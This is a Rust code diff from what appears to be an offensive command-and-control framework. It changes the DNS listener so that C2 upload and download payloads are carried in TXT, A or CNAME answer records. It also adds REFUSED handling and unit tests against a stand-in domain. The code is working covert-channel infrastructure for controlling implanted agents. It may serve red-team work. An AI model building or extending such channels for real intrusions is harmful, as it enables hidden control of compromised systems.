@@ -2452,7 +2452,7 @@ impl DnsListenerState {
         match c2_query {
             DnsC2Query::Upload { agent_id, seq, total, data } => {
                 let txt = self.handle_upload(agent_id, seq, total, data, peer_ip).await;
-                Some(build_dns_txt_response(
+                Some(self.dns_c2_response_or_refused(
                     query.id,
                     &query.qname_raw,
                     query.qtype,
@@ -2461,12 +2461,35 @@ impl DnsListenerState {
             }
             DnsC2Query::Download { agent_id, seq } => {
                 let txt = self.handle_download(agent_id, seq).await;
-                Some(build_dns_txt_response(
+                Some(self.dns_c2_response_or_refused(
                     query.id,
                     &query.qname_raw,
                     query.qtype,
                     txt.as_bytes(),
                 ))
+            }
+        }
+    }
+
+    /// Build a DNS response for the C2 payload, or REFUSED when the payload cannot be encoded
+    /// for the query type (for example, payloads longer than four octets for `A` queries).
+    fn dns_c2_response_or_refused(
+        &self,
+        query_id: u16,
+        qname_raw: &[u8],
+        qtype: u16,
+        payload: &[u8],
+    ) -> Vec<u8> {
+        match build_dns_c2_response(query_id, qname_raw, qtype, payload) {
+            Some(resp) => resp,
+            None => {
+                warn!(
+                    listener = %self.config.name,
+                    qtype,
+                    payload_len = payload.len(),
+                    "dns c2 response cannot be encoded for this query type; sending REFUSED"
+                );
+                build_dns_refused_response(query_id)
             }
         }
     }
@@ -3007,20 +3030,82 @@ fn chunk_response_to_b32hex(payload: &[u8]) -> Vec<String> {
     payload.chunks(DNS_RESPONSE_CHUNK_BYTES).map(base32hex_encode).collect()
 }
 
-/// Build a DNS TXT response for `query_id` carrying `txt_data`.
+/// Maximum octets in a single DNS label (RFC 1035).
+const DNS_MAX_LABEL_LEN: usize = 63;
+/// Maximum wire-format length of a domain name (RFC 1035).
+const DNS_MAX_DOMAIN_WIRE_LEN: usize = 255;
+
+/// Encode `payload` as a DNS wire-format domain name (length-prefixed labels, root terminator).
+///
+/// The payload is split into labels of at most [`DNS_MAX_LABEL_LEN`] octets. Used for CNAME
+/// RDATA so arbitrary C2 strings (base32hex chunks, status tokens) fit in a single RR.
+fn dns_wire_domain_from_ascii_payload(payload: &str) -> Option<Vec<u8>> {
+    let mut out = Vec::new();
+    if payload.is_empty() {
+        out.push(1);
+        out.push(b'0');
+        out.push(0);
+        return Some(out);
+    }
+    for chunk in payload.as_bytes().chunks(DNS_MAX_LABEL_LEN) {
+        let len = chunk.len();
+        let len_u8 = u8::try_from(len).ok()?;
+        out.push(len_u8);
+        out.extend_from_slice(chunk);
+        if out.len() > DNS_MAX_DOMAIN_WIRE_LEN {
+            return None;
+        }
+    }
+    if out.len() + 1 > DNS_MAX_DOMAIN_WIRE_LEN {
+        return None;
+    }
+    out.push(0);
+    Some(out)
+}
+
+/// Build a DNS response for `query_id` carrying C2 `payload` in an answer RR matching `qtype`.
 ///
 /// The question section is reconstructed from `qname_raw` (which already includes the
-/// zero-label terminator), and a single answer TXT record is appended using a pointer
-/// back to offset 12 (the start of the question QNAME).
-fn build_dns_txt_response(query_id: u16, qname_raw: &[u8], qtype: u16, txt_data: &[u8]) -> Vec<u8> {
-    // Clamp TXT data to 255 bytes (single TXT string limit per RFC 1035).
-    let txt_data = &txt_data[..txt_data.len().min(255)];
-    // RDLENGTH = 1 (length byte) + txt_data.len()
-    let rdlength = u16::try_from(1 + txt_data.len()).unwrap_or(u16::MAX);
+/// zero-label terminator). The answer uses a NAME pointer to offset 12 (start of the question
+/// QNAME).
+///
+/// Returns `None` when the payload cannot be represented for the requested type (for example,
+/// more than four octets for `A`).
+fn build_dns_c2_response(
+    query_id: u16,
+    qname_raw: &[u8],
+    qtype: u16,
+    payload: &[u8],
+) -> Option<Vec<u8>> {
+    let (answer_type, rdata): (u16, Vec<u8>) = match qtype {
+        DNS_TYPE_TXT => {
+            // Clamp TXT data to 255 bytes (single TXT string limit per RFC 1035).
+            let txt_data = &payload[..payload.len().min(255)];
+            let mut rdata = Vec::with_capacity(1 + txt_data.len());
+            rdata.push(txt_data.len() as u8);
+            rdata.extend_from_slice(txt_data);
+            (DNS_TYPE_TXT, rdata)
+        }
+        DNS_TYPE_A => {
+            if payload.len() > 4 {
+                return None;
+            }
+            let mut rdata = [0u8; 4];
+            rdata[..payload.len()].copy_from_slice(payload);
+            (DNS_TYPE_A, rdata.to_vec())
+        }
+        DNS_TYPE_CNAME => {
+            let s = std::str::from_utf8(payload).ok()?;
+            let rdata = dns_wire_domain_from_ascii_payload(s)?;
+            (DNS_TYPE_CNAME, rdata)
+        }
+        _ => return None,
+    };
 
-    let mut response = Vec::with_capacity(
-        DNS_HEADER_LEN + qname_raw.len() + 1 + 4 + 2 + 2 + 2 + 4 + 2 + 1 + txt_data.len(),
-    );
+    let rdlength = u16::try_from(rdata.len()).ok()?;
+
+    let mut response =
+        Vec::with_capacity(DNS_HEADER_LEN + qname_raw.len() + 4 + 2 + 2 + 2 + 4 + 2 + rdata.len());
 
     // Header (12 bytes)
     response.extend_from_slice(&query_id.to_be_bytes());
@@ -3031,8 +3116,7 @@ fn build_dns_txt_response(query_id: u16, qname_raw: &[u8], qtype: u16, txt_data:
     response.extend_from_slice(&0u16.to_be_bytes()); // nscount = 0
     response.extend_from_slice(&0u16.to_be_bytes()); // arcount = 0
 
-    // Question section: QNAME (includes zero-label terminator) + QTYPE + QCLASS
-    // qname_raw includes the zero-label terminator as captured by parse_dns_query.
+    // Question section: QNAME + QTYPE + QCLASS
     response.extend_from_slice(qname_raw);
     response.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
     response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // QCLASS
@@ -3040,14 +3124,13 @@ fn build_dns_txt_response(query_id: u16, qname_raw: &[u8], qtype: u16, txt_data:
     // Answer RR
     // NAME: pointer to offset 12 (start of QNAME in question), encoded as 0xC00C
     response.extend_from_slice(&[0xC0, 0x0C]);
-    response.extend_from_slice(&DNS_TYPE_TXT.to_be_bytes()); // TYPE = TXT
+    response.extend_from_slice(&answer_type.to_be_bytes());
     response.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // CLASS = IN
     response.extend_from_slice(&0u32.to_be_bytes()); // TTL = 0 (no caching)
     response.extend_from_slice(&rdlength.to_be_bytes()); // RDLENGTH
-    response.push(txt_data.len() as u8); // TXT string length byte
-    response.extend_from_slice(txt_data); // TXT string data
+    response.extend_from_slice(&rdata);
 
-    response
+    Some(response)
 }
 
 /// Build a DNS REFUSED response for `query_id`.
@@ -3815,14 +3898,14 @@ mod tests {
         MAX_DEMON_INIT_ATTEMPTS_PER_IP, MAX_SMB_FRAME_PAYLOAD_LEN,
         MAX_UNKNOWN_CALLBACK_PROBE_AUDITS_PER_SOURCE, TrustedProxyPeer,
         UNKNOWN_CALLBACK_PROBE_AUDIT_WINDOW_DURATION, UnknownCallbackProbeAuditLimiter,
-        action_from_mark, base32hex_decode, base32hex_encode, build_dns_txt_response,
+        action_from_mark, base32hex_decode, base32hex_encode, build_dns_c2_response,
         chunk_response_to_b32hex, collect_body_with_magic_precheck, dns_allowed_query_types,
-        extract_external_ip, handle_external_request, is_past_kill_date,
-        listener_config_from_operator, listener_error_event, listener_event_for_action,
-        listener_removed_event, operator_protocol_name, operator_requests_start,
-        parse_dns_c2_query, parse_dns_query, parse_trusted_proxy_peer, profile_listener_configs,
-        read_smb_frame, smb_local_socket_name, spawn_dns_listener_runtime,
-        spawn_managed_listener_task, spawn_smb_listener_runtime,
+        dns_wire_domain_from_ascii_payload, extract_external_ip, handle_external_request,
+        is_past_kill_date, listener_config_from_operator, listener_error_event,
+        listener_event_for_action, listener_removed_event, operator_protocol_name,
+        operator_requests_start, parse_dns_c2_query, parse_dns_query, parse_trusted_proxy_peer,
+        profile_listener_configs, read_smb_frame, smb_local_socket_name,
+        spawn_dns_listener_runtime, spawn_managed_listener_task, spawn_smb_listener_runtime,
     };
     use crate::{
         AgentRegistry, AuditQuery, AuditResultStatus, Database, EventBus, Job,
@@ -6804,6 +6887,28 @@ mod tests {
         format!("{}.{seq:x}-{total:x}-{agent_id:08x}.up.{domain}", base32hex_encode(chunk))
     }
 
+    /// Return the TYPE field of the first answer RR (after a single question).
+    ///
+    /// `qname_raw_len` is the length of the wire-format QNAME in the echoed question
+    /// (including the root label's zero octet).
+    fn dns_answer_rr_type(packet: &[u8], qname_raw_len: usize) -> Option<u16> {
+        let ans_start = DNS_HEADER_LEN.checked_add(qname_raw_len)?.checked_add(4)?;
+        let type_off = ans_start.checked_add(2)?;
+        let t = packet.get(type_off..type_off + 2)?;
+        Some(u16::from_be_bytes([t[0], t[1]]))
+    }
+
+    /// RDATA octets of the first answer RR (single question, compressed NAME pointer).
+    fn dns_answer_rdata(packet: &[u8], qname_raw_len: usize) -> Option<Vec<u8>> {
+        let ans_start = DNS_HEADER_LEN.checked_add(qname_raw_len)?.checked_add(4)?;
+        let rdlen_off = ans_start.checked_add(2 + 2 + 2 + 4)?;
+        let rdlen =
+            u16::from_be_bytes([*packet.get(rdlen_off)?, *packet.get(rdlen_off + 1)?]) as usize;
+        let rdata_start = rdlen_off.checked_add(2)?;
+        let end = rdata_start.checked_add(rdlen)?;
+        Some(packet.get(rdata_start..end)?.to_vec())
+    }
+
     fn parse_dns_txt_answer(packet: &[u8]) -> Option<String> {
         if packet.len() < DNS_HEADER_LEN {
             return None;
@@ -7131,25 +7236,67 @@ mod tests {
     }
 
     #[test]
-    fn build_dns_txt_response_produces_parseable_answer() {
+    fn build_dns_c2_response_answer_rr_matches_txt_a_cname_queries() {
+        let payload = b"ok";
+        for (qtype, expected_type) in [
+            (DNS_TYPE_TXT, DNS_TYPE_TXT),
+            (DNS_TYPE_A, DNS_TYPE_A),
+            (DNS_TYPE_CNAME, DNS_TYPE_CNAME),
+        ] {
+            let packet = build_dns_query(0xABCD, "test.c2.example.com", qtype);
+            let parsed = parse_dns_query(&packet).expect("parse failed");
+            let response =
+                build_dns_c2_response(parsed.id, &parsed.qname_raw, parsed.qtype, payload)
+                    .expect("response should encode");
+
+            assert!(response.len() >= DNS_HEADER_LEN);
+            assert!(response[2] & 0x80 != 0, "QR bit not set");
+            let ancount = u16::from_be_bytes([response[6], response[7]]);
+            assert_eq!(ancount, 1);
+
+            let question_qtype_offset = DNS_HEADER_LEN + parsed.qname_raw.len();
+            let echoed_qtype = u16::from_be_bytes([
+                response[question_qtype_offset],
+                response[question_qtype_offset + 1],
+            ]);
+            assert_eq!(echoed_qtype, qtype);
+
+            assert_eq!(
+                dns_answer_rr_type(&response, parsed.qname_raw.len()),
+                Some(expected_type),
+                "answer RR TYPE must match query type {qtype}"
+            );
+        }
+
+        let packet_a = build_dns_query(0xABCD, "test.c2.example.com", DNS_TYPE_A);
+        let parsed_a = parse_dns_query(&packet_a).expect("parse failed");
+        let response_a =
+            build_dns_c2_response(parsed_a.id, &parsed_a.qname_raw, parsed_a.qtype, b"ok")
+                .expect("a response");
+        assert_eq!(
+            dns_answer_rdata(&response_a, parsed_a.qname_raw.len()),
+            Some(vec![b'o', b'k', 0, 0])
+        );
+    }
+
+    #[test]
+    fn build_dns_c2_response_returns_none_when_a_payload_exceeds_four_octets() {
         let packet = build_dns_query(0xABCD, "test.c2.example.com", DNS_TYPE_A);
         let parsed = parse_dns_query(&packet).expect("parse failed");
-        let txt = b"ok";
-        let response = build_dns_txt_response(parsed.id, &parsed.qname_raw, parsed.qtype, txt);
+        assert!(
+            build_dns_c2_response(parsed.id, &parsed.qname_raw, parsed.qtype, b"hello").is_none()
+        );
+    }
 
-        // Response must be at least header + question + answer
-        assert!(response.len() >= DNS_HEADER_LEN);
-        // QR bit set
-        assert!(response[2] & 0x80 != 0, "QR bit not set");
-        // ANCOUNT = 1
-        let ancount = u16::from_be_bytes([response[6], response[7]]);
-        assert_eq!(ancount, 1);
-        let question_qtype_offset = DNS_HEADER_LEN + parsed.qname_raw.len();
-        let echoed_qtype = u16::from_be_bytes([
-            response[question_qtype_offset],
-            response[question_qtype_offset + 1],
-        ]);
-        assert_eq!(echoed_qtype, DNS_TYPE_A);
+    #[test]
+    fn dns_wire_domain_splits_long_payload_into_labels() {
+        let s = "a".repeat(130);
+        let wire = dns_wire_domain_from_ascii_payload(&s).expect("wire");
+        assert!(wire.len() <= 255);
+        assert_eq!(wire[0], 63);
+        assert_eq!(wire[64], 63);
+        assert_eq!(wire[128], 4);
+        assert_eq!(wire[133], 0);
     }
 
     #[test]
@@ -7320,6 +7467,54 @@ mod tests {
         // ANCOUNT = 1
         let ancount = u16::from_be_bytes([buf[6], buf[7]]);
         assert_eq!(ancount, 1);
+        let parsed = parse_dns_query(&packet).expect("query should parse");
+        assert_eq!(
+            dns_answer_rr_type(&buf, parsed.qname_raw.len()),
+            Some(DNS_TYPE_TXT),
+            "answer RR must be TXT when the query is TXT"
+        );
+        handle.abort();
+    }
+
+    #[tokio::test]
+    async fn dns_listener_a_query_returns_ipv4_rdata_when_payload_fits() {
+        let port = free_udp_port();
+        let config = red_cell_common::DnsListenerConfig {
+            name: "dns-a-rdata".to_owned(),
+            host_bind: "127.0.0.1".to_owned(),
+            port_bind: port,
+            domain: "c2.example.com".to_owned(),
+            record_types: vec!["A".to_owned()],
+            kill_date: None,
+            working_hours: None,
+        };
+        let (handle, _) = spawn_test_dns_listener(config).await;
+
+        sleep(Duration::from_millis(50)).await;
+
+        let client = TokioUdpSocket::bind("127.0.0.1:0").await.expect("client bind failed");
+        client.connect(format!("127.0.0.1:{port}")).await.expect("connect failed");
+
+        let packet = build_dns_query(0x7777, "0-deadbeef.dn.c2.example.com", DNS_TYPE_A);
+        client.send(&packet).await.expect("send failed");
+
+        let mut buf = vec![0u8; 512];
+        tokio::time::timeout(Duration::from_secs(2), client.recv(&mut buf))
+            .await
+            .expect("no response received")
+            .expect("recv failed");
+
+        assert_eq!(buf[3] & 0x0F, 0, "expected NOERROR");
+        let parsed = parse_dns_query(&packet).expect("query should parse");
+        assert_eq!(
+            dns_answer_rr_type(&buf, parsed.qname_raw.len()),
+            Some(DNS_TYPE_A),
+            "answer RR must be A when the query is A"
+        );
+        assert_eq!(
+            dns_answer_rdata(&buf, parsed.qname_raw.len()),
+            Some(vec![b'w', b'a', b'i', b't'])
+        );
         handle.abort();
     }
 
@@ -7493,6 +7688,11 @@ mod tests {
         let echoed_qtype =
             u16::from_be_bytes([buf[question_qtype_offset], buf[question_qtype_offset + 1]]);
         assert_eq!(echoed_qtype, DNS_TYPE_CNAME);
+        assert_eq!(
+            dns_answer_rr_type(&buf, parsed.qname_raw.len()),
+            Some(DNS_TYPE_CNAME),
+            "answer RR must be CNAME when the query is CNAME"
+        );
         handle.abort();
     }
 
